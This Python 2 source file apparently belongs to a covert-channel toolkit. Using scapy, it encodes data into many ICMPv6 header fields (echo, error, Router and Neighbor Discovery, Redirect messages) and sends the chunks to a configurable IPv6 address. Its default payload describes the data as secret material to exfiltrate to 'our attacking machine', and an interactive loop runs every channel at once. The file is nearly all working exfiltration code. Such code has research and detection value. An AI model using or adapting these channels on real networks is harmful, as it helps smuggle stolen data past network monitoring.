#!/usr/bin/python

import sys
import re, uuid
import os
import readline
from pprint import pprint
from commands import *
from scapy.all import *
from receiver import *
from bitstring import *

"""
This class is for testing all covert channels in one
"""
class AllCovertTests:

    def __init__(self, iface):
        self.dataToExfilt = ': this is the super secret data to exfiltrate to our attacking machine\n'        
        self.ipAddress = 'fe80::3e97:eff:feee:3124'
        self.iface = iface
        self.name = 'AllCovertTests'

    def startSystem(self):
        Commands.setAllCovertTestHistory()
        running = 1
        while running:
            readline.parse_and_bind("tab: complete")
            #we receive data from the keyboard                    
            command  = raw_input(self.name + ' >>')
            #help command
            if re.match('help', command):
                self.showHelp()
            #quit module command
            elif re.match('quit', command):
                running = 0
                Commands.setCovertChannelHistory()
            elif re.match('setAdr', command):
                self.ipAddress = re.sub('setAdr', ' ', command).lstrip()
                print 'setting Ip address: ' + self.ipAddress
            #execution of all tests
            elif re.match('exec', command):
                dest = DestinationUnreachableCovert()
                dest.execModule(self.dataToExfilt, '', '', '', self.iface, self.ipAddress)
                dest.execModule('', self.dataToExfilt, '', '', self.iface, self.ipAddress)
                dest.execModule('', '', self.dataToExfilt, '', self.iface, self.ipAddress)
                dest.execModule('', '', '', self.dataToExfilt, self.iface, self.ipAddress)
                big = PacketTooBigCovert()
                big.execModule(self.dataToExfilt, '', self.iface, self.ipAddress)
                big.execModule('', self.dataToExfilt, self.iface, self.ipAddress)
                time = TimeExceededCovert()
                time.execModule(self.dataToExfilt, '', '', '', self.iface, self.ipAddress)
                time.execModule('', self.dataToExfilt, '', '', self.iface, self.ipAddress)
                time.execModule('', '', self.dataToExfilt, '', self.iface, self.ipAddress)
                time.execModule('', '', '', self.dataToExfilt, self.iface, self.ipAddress)
                param = ParameterProblemCovert()
                param.execModule(self.dataToExfilt, '', self.iface, self.ipAddress)
                param.execModule('', self.dataToExfilt, self.iface, self.ipAddress)
                echoReq = EchoRequestCovert()
                echoReq.execModule(self.dataToExfilt, '', '', '', self.iface, self.ipAddress)
                echoReq.execModule('', self.dataToExfilt, '', '', self.iface, self.ipAddress)
                echoReq.execModule('', '', self.dataToExfilt, '', self.iface, self.ipAddress)
                echoReq.execModule('', '', '', self.dataToExfilt, self.iface, self.ipAddress)
                echoRep = EchoReplyCovert()
                echoRep.execModule(self.dataToExfilt, '', '', '', self.iface, self.ipAddress)
                echoRep.execModule('', self.dataToExfilt, '', '', self.iface, self.ipAddress)
                echoRep.execModule('', '', self.dataToExfilt, '', self.iface, self.ipAddress)
                echoRep.execModule('', '', '', self.dataToExfilt, self.iface, self.ipAddress)
                routerSol = RouterSolicitationCovert()
                routerSol.execModule(self.dataToExfilt, '', self.iface, self.ipAddress)
                routerSol.execModule('', self.dataToExfilt, self.iface, self.ipAddress)
                #only tested 8 bit or more (no M,O,Reserved)
                routerAdv = RouterAdvertisementCovert()
                routerAdv.execModule(self.dataToExfilt, '', '', '', '', '', '', '', self.iface, self.ipAddress)
                routerAdv.execModule('', self.dataToExfilt, '', '', '', '', '', '', self.iface, self.ipAddress)
                #reachable time error
                #routerAdv.execModule('', '', '', '', '', self.dataToExfilt, '', '', self.iface, self.ipAddress)
                routerAdv.execModule('', '', '', '', '', '', self.dataToExfilt, '', self.iface, self.ipAddress)
                routerAdv.execModule('', '', '', '', '', '', '', self.dataToExfilt, self.iface, self.ipAddress)                
                neighbSol = NeighborSolicitationCovert()
                neighbSol.execModule(self.dataToExfilt, '', '', self.iface, self.ipAddress)
                neighbSol.execModule('', self.dataToExfilt, '', self.iface, self.ipAddress)
                #target address requires socket.AF_INET6 type
                #neighbSol.execModule('', '', self.dataToExfilt, self.iface, self.ipAddress)                
                #only tested 8 bit or more (no R,S,O)
                neighbAdv = NeighborAdvertisementCovert()
                neighbAdv.execModule(self.dataToExfilt, '', '', '', '', '', self.iface, self.ipAddress)
                neighbAdv.execModule('', '', '', '', self.dataToExfilt, '', self.iface, self.ipAddress)
                #target address requires socket.AF_INET6 type
                #neighbAdv.execModule('', '', '', '', '', self.dataToExfilt, self.iface, self.ipAddress)
                redirect = RedirectCovert()
                redirect.execModule(self.dataToExfilt, '', '', '', self.iface, self.ipAddress)
                redirect.execModule('', self.dataToExfilt, '', '', self.iface, self.ipAddress)
                #target address requires socket.AF_INET6 type
                #redirect.execModule('', '', self.dataToExfilt, '', self.iface, self.ipAddress)
                #destination address requires socket.AF_INET6 type
                #redirect.execModule('', '', '', self.dataToExfilt, self.iface, self.ipAddress)
                
            elif re.match('rec', command):
                HelperClass.receiver(self.iface, self.ipAddress)

    def showHelp(self):
        for entry in Help.getAllCovertTestHelp():
            print entry

class DestinationUnreachableCovert:
    
    def __init__(self):
        self.bandwidthCode = 1
        self.bandwidthLength = 1
        self.bandwidthUnused = 3
        self.bandwidthPayload = 8
        self.nameCode = 'Destination Unreachable code '
        self.nameLength = 'Destination Unreachable length '
        self.nameUnused = 'Destination Unreachable unused '
        self.namePayload = 'Destination Unreachable payload '
        
    def buildPacketCode(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6DestUnreach(code=chunk)/"x"

    def buildPacketLength(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6DestUnreach(length=chunk)/"x"

    def buildPacketUnused(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6DestUnreach(unused=chunk)/"x"

    def buildPacketPayload(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6DestUnreach()/str(chunk)
        
    def execModule(self, dataCode, dataLength, dataUnused, dataPayload, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode, self.nameCode)
            for chunk in sendingBuffer:
                self.buildPacketCode(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        if dataLength:
            data = self.nameLength+dataLength
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthLength, self.nameLength)
            for chunk in sendingBuffer:
                self.buildPacketLength(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        if dataUnused:
            data = self.nameUnused+dataUnused
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthUnused, self.nameUnused)
            for chunk in sendingBuffer:
                self.buildPacketUnused(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        if dataPayload:
            data = self.namePayload+dataPayload
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthPayload, self.namePayload)
            for chunk in sendingBuffer:
                self.buildPacketPayload(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)

        
class PacketTooBigCovert:

    def __init__(self):
        self.bandwidthCode = 1
        self.bandwidthMtu = 4
        self.nameCode = 'Packet Too Big code '
        self.nameMtu = 'Packet Too Big MTU '
        
    def buildPacketCode(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6PacketTooBig(code=chunk)/"x"

    def buildPacketMtu(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6PacketTooBig(mtu=chunk)/"x"
        
    def execModule(self, dataCode, dataMtu, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode, self.nameCode)
            for chunk in sendingBuffer:
                self.buildPacketCode(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        elif dataMtu:
            data = self.nameMtu+dataMtu
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthMtu, self.nameMtu)
            for chunk in sendingBuffer:
                self.buildPacketMtu(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)            

class TimeExceededCovert:

    def __init__(self):
        self.bandwidthCode = 1
        self.bandwidthLength = 1
        self.bandwidthUnused = 3
        self.bandwidthPayload = 8
        self.nameCode = 'Time Exceeded code '
        self.nameLength = 'Time Exceeded length '
        self.nameUnused = 'Time Exceeded unused '
        self.namePayload = 'Time Exceeded payload '

    def buildPacketCode(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6TimeExceeded(code=chunk)/"x"

    def buildPacketLength(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6TimeExceeded(length=chunk)/"x"

    def buildPacketUnused(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6TimeExceeded(unused=chunk)/"x"

    def buildPacketPayload(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6TimeExceeded()/str(chunk)
        
    def execModule(self, dataCode, dataLength, dataUnused, dataPayload, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode, self.nameCode)
            for chunk in sendingBuffer:
                self.buildPacketCode(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        if dataLength:
            data = self.nameLength+dataLength
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthLength, self.nameLength)
            for chunk in sendingBuffer:
                self.buildPacketLength(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        if dataUnused:
            data = self.nameUnused+dataUnused
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthUnused, self.nameUnused)
            for chunk in sendingBuffer:
                self.buildPacketUnused(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        if dataPayload:
            data = self.namePayload+dataPayload
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthPayload, self.namePayload)
            for chunk in sendingBuffer:
                self.buildPacketPayload(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
            
class ParameterProblemCovert:

    def __init__(self):
        self.bandwidthCode = 1
        self.bandwidthPointer = 4
        self.nameCode = 'Parameter Problem code '
        self.namePointer = 'Parameter Problem pointer '
        
    def buildPacketCode(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ParamProblem(code=chunk)/"x"

    def buildPacketPointer(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ParamProblem(ptr=chunk)/"x"

    def execModule(self, dataCode, dataPointer, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode, self.nameCode)
            for chunk in sendingBuffer:
                self.buildPacketCode(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        elif dataPointer:
            data = self.namePointer+dataPointer
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthPointer, self.namePointer)
            for chunk in sendingBuffer:
                self.buildPacketPointer(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
                
        
class EchoRequestCovert:

    def __init__(self):
        self.bandwidthCode = 1
        self.bandwidthId = 2
        self.bandwidthSeq = 2
        self.bandwidthData = 8
        self.nameCode = 'Echo Request code '
        self.nameId = 'Echo Request identifier '
        self.nameSeq = 'Echo Request sequence number '
        self.nameData = 'Echo Request data '

    def buildPacketCode(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6EchoRequest(code=chunk)

    def buildPacketId(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6EchoRequest(id=chunk)

    def buildPacketSeq(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6EchoRequest(seq=chunk)

    def buildPacketData(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6EchoRequest(data=chunk)

    def execModule(self, dataCode, dataId, dataSeq, dataData, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode, self.nameCode)
            for chunk in sendingBuffer:
                self.buildPacketCode(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        elif dataId:
            data = self.nameId+dataId
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthId, self.nameId)
            for chunk in sendingBuffer:
                self.buildPacketId(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        elif dataSeq:
            data = self.nameSeq+dataSeq
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthSeq, self.nameSeq)
            for chunk in sendingBuffer:
                self.buildPacketSeq(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        elif dataData:
            data = self.nameData+dataData
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthData, self.nameData)
            for chunk in sendingBuffer:
                self.buildPacketData(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
                
        
class EchoReplyCovert:

    def __init__(self):
        self.bandwidthCode = 1
        self.bandwidthId = 2
        self.bandwidthSeq = 2
        self.bandwidthData = 8
        self.nameCode = 'Echo Reply code '
        self.nameId = 'Echo Reply identifier '
        self.nameSeq = 'Echo Reply sequence number '
        self.nameData = 'Echo Reply data '

    def buildPacketCode(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6EchoReply(code=chunk)

    def buildPacketId(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6EchoReply(id=chunk)

    def buildPacketSeq(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6EchoReply(seq=chunk)

    def buildPacketData(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6EchoReply(data=chunk)

    def execModule(self, dataCode, dataId, dataSeq, dataData, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode, self.nameCode)
            for chunk in sendingBuffer:
                self.buildPacketCode(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        elif dataId:
            data = self.nameId+dataId
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthId, self.nameId)
            for chunk in sendingBuffer:
                self.buildPacketId(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        elif dataSeq:
            data = self.nameSeq+dataSeq
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthSeq, self.nameSeq)
            for chunk in sendingBuffer:
                self.buildPacketSeq(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        elif dataData:
            data = self.nameData+dataData
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthData, self.nameData)
            for chunk in sendingBuffer:
                self.buildPacketData(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
            
        
class RouterSolicitationCovert:

    def __init__(self):
        self.bandwidthCode = 1
        self.bandwidthRes = 4
        self.nameCode = 'Router Solicitation code '
        self.nameRes = 'Router Solicitation reserved '

    def buildPacketCode(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_RS(code=chunk)

    def buildPacketRes(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_RS(res=chunk)

    def execModule(self, dataCode, dataRes, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode, self.nameCode)
            for chunk in sendingBuffer:
                self.buildPacketCode(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        elif dataRes:
            data = self.nameRes+dataRes
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthRes, self.nameRes)
            for chunk in sendingBuffer:
                self.buildPacketRes(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
                
        
class RouterAdvertisementCovert:

    def __init__(self):
        self.bandwidthCode = 1
        self.bandwidthCurHopLimit = 1
        self.bandwidthM = 1
        self.bandwidthO = 1
        self.bandwidthRes = 1
        self.bandwidthRouterLifeTime = 2
        self.bandwidthReachTime = 4
        self.bandwidthRetransTimer = 4
        self.nameCode = 'Router Advertisement code '
        self.nameCurHopLimit = 'Router Advertisement Cur Hop LImit '
        self.nameM = 'Router Advertisement M '
        self.nameO = 'Router Advertisement O '
        self.nameRes = 'Router Advertisement reserved '
        self.nameRouterLifeTime = 'Router Advertisement router life time '
        self.nameReachTime = 'Router Advertisement reachable time '
        self.nameRetransTimer = 'Router Advertisement retrans timer '

    def buildPacketCode(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_RA(code=chunk)

    def buildPacketCurHopLimit(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_RA(chlim=chunk)

    def buildPacketM(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_RA(M=chunk)

    def buildPacketO(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_RA(O=chunk)

    def buildPacketRes(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_RA(res=chunk)

    def buildPacketRouterLifeTime(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_RA(routerlifetime=chunk)

    def buildPacketReachTime(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_RA(reachabletime=chunk)

    def buildPacketRetransTimer(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_RA(retranstimer=chunk)
        
    def execModule(self, dataCode, dataChlim, dataM, dataO, dataRes, dataRouterLifeTime, dataReachTime, dataRetransTimer, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode, self.nameCode)
            for chunk in sendingBuffer:
                self.buildPacketCode(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        elif dataChlim:
            data = self.nameCurHopLimit+dataChlim
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCurHopLimit, self.nameCurHopLimit)
            for chunk in sendingBuffer:
                self.buildPacketCurHopLimit(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        elif dataM:
            data = self.nameM+dataM
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthM, self.nameM)
            for chunk in sendingBuffer:
                self.buildPacketM(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        elif dataO:
            data = self.nameO+dataO
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthO, self.nameO)
            for chunk in sendingBuffer:
                self.buildPacketO(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        elif dataRes:
            data = self.nameRes+dataRes
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthRes, self.nameRes)
            for chunk in sendingBuffer:
                self.buildPacketRes(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        elif dataRouterLifeTime:
            data = self.nameRouterLifeTime+dataRouterLifeTime
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthRouterLifeTime, self.nameRouterLifeTime)
            for chunk in sendingBuffer:
                self.buildPacketRouterLifeTime(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        elif dataReachTime:
            data = self.nameReachTime+dataReachTime
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthReachTime, self.nameReachTime)
            for chunk in sendingBuffer:
                self.buildPacketReachTime(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        elif dataRetransTimer:
            data = self.nameRetransTimer+dataRetransTimer
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthRetransTimer, self.nameRetransTimer)
            for chunk in sendingBuffer:
                self.buildPacketRetransTimer(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
                
        
class NeighborSolicitationCovert:

    def __init__(self):
        self.bandwidthCode = 1
        #it seems that scapy uses only 3 bytes
        self.bandwidthRes = 4
        self.bandwidthTargetAdr = 16
        self.nameCode = 'Neighbor Solicitation code '
        self.nameRes = 'Neighbor Solicitation reserved '
        self.nameTargetAdr = 'Neighbor Solicitation target address '

    def buildPacketCode(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_NS(code=chunk)

    def buildPacketRes(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_NS(res=chunk)

    def buildPacketTargetAdr(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_NS(tgt=chunk)        

    def execModule(self, dataCode, dataRes, dataTargetAdr, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode, self.nameCode)
            for chunk in sendingBuffer:
                self.buildPacketCode(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        elif dataRes:
            data = self.nameRes+dataRes
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthRes, self.nameRes)
            for chunk in sendingBuffer:
                self.buildPacketRes(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        elif dataTargetAdr:
            data = self.nameTargetAdr+dataTargetAdr
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthTargetAdr, self.nameTargetAdr)
            for chunk in sendingBuffer:
                self.buildPacketTargetAdr(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)                

                
class NeighborAdvertisementCovert:

    def __init__(self):
        self.bandwidthCode = 1
        self.bandwidthR = 1
        self.bandwidthS = 1        
        self.bandwidthO = 1
        #able to manage only multiple of 8 - reserved field is 29
        self.bandwidthRes = 3
        self.bandwidthTargetAddress = 16
        self.nameCode = 'Neighbor Advertisement code '
        self.nameR = 'Neighbor Advertisement R '
        self.nameS = 'Neighbor Advertisement S '
        self.nameO = 'Neighbor Advertisement O '        
        self.nameRes = 'Neighbor Advertisement reserved '
        self.nameTargetAddress = 'Neighbor Advertisement target address '

    def buildPacketCode(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_NA(code=chunk)

    def buildPacketR(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_NA(R=chunk)

    def buildPacketS(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_NA(S=chunk)

    def buildPacketO(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_NA(O=chunk)        

    def buildPacketRes(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_NA(res=chunk)

    def buildPacketTargetAddress(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_NA(tgt=chunk)
        
    def execModule(self, dataCode, dataR, dataS, dataO, dataRes, dataTargetAddress, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode, self.nameCode)
            for chunk in sendingBuffer:
                self.buildPacketCode(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        elif dataR:
            data = self.nameR+dataR
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthR, self.nameR)
            for chunk in sendingBuffer:
                self.buildPacketR(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        elif dataS:
            data = self.nameS+dataS
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthS, self.nameS)
            for chunk in sendingBuffer:
                self.buildPacketS(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        elif dataO:
            data = self.nameO+dataO
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthO, self.nameO)
            for chunk in sendingBuffer:
                self.buildPacketO(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        elif dataRes:
            data = self.nameRes+dataRes
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthRes, self.nameRes)
            for chunk in sendingBuffer:
                self.buildPacketRes(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        elif dataTargetAddress:
            data = self.nameTargetAddress+dataTargetAddress
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthTargetAddress, self.nameTargetAddress)
            for chunk in sendingBuffer:
                self.buildPacketTargetAddress(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)

        
class RedirectCovert:

    def __init__(self):
        self.bandwidthCode = 1
        self.bandwidthRes = 4
        self.bandwidthTargetAdr = 16
        self.bandwidthDestAdr = 16
        self.nameCode = 'Redirect code '
        self.nameRes = 'Redirect reserved '
        self.nameTargetAdr = 'Redirect target address '
        self.nameDestAdr = 'Redirect destination address '        

    def buildPacketCode(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_Redirect(code=chunk)

    def buildPacketRes(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_Redirect(res=chunk)

    def buildPacketTargetAdr(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_Redirect(tgt=chunk)        

    def buildPacketDestAdr(self, chunk, ipAdr):
        self.packet = IPv6(dst=ipAdr)/ICMPv6ND_Redirect(tgt=chunk)        
        
    def execModule(self, dataCode, dataRes, dataTargetAdr, dataDestAdr, exitIface, ipAdr):
        if dataCode:
            data = self.nameCode+dataCode
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthCode, self.nameCode)
            for chunk in sendingBuffer:
                self.buildPacketCode(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        elif dataRes:
            data = self.nameRes+dataRes
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthRes, self.nameRes)
            for chunk in sendingBuffer:
                self.buildPacketRes(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        elif dataTargetAdr:
            data = self.nameTargetAdr+dataTargetAdr
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthTargetAdr, self.nameTargetAdr)
            for chunk in sendingBuffer:
                self.buildPacketTargetAdr(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)
        elif dataDestAdr:
            data = self.nameDestAdr+dataDestAdr
            sendingBuffer = HelperClass.chunkPackets(data, self.bandwidthDestAdr, self.nameDestAdr)
            for chunk in sendingBuffer:
                self.buildPacketDestAdr(chunk, ipAdr)
                send(self.packet, iface=exitIface, verbose=False)  

                
class HelperClass:

    @classmethod
    def chunkPackets(self, data, maxPacketSize, messageAndField):
        print '[*] %s' % messageAndField 
        print '[*] bandwidth %d' % maxPacketSize
        sendingBuffer = []
        chunkNumber = 0
        print '[*] size of data %d' % len(data)
        chunks = [data[i:i+maxPacketSize] for i in range(0, len(data), maxPacketSize)]
        for tmpChunk in chunks:
            chunkNumber += 1
            tmpBit = BitArray()
            for c in tmpChunk:
                bit = BitArray(uint=ord(c), length=8)
                tmpBit.append(bit)
            #print tmpBit.bin
            sendingBuffer.append(int(tmpBit.bin, 2))
        print '[*] chunks %d' % chunkNumber
        return sendingBuffer

    @classmethod
    def receiver(self, iface, adr):
        rec = Receiver(iface, adr)
        rec.receive()
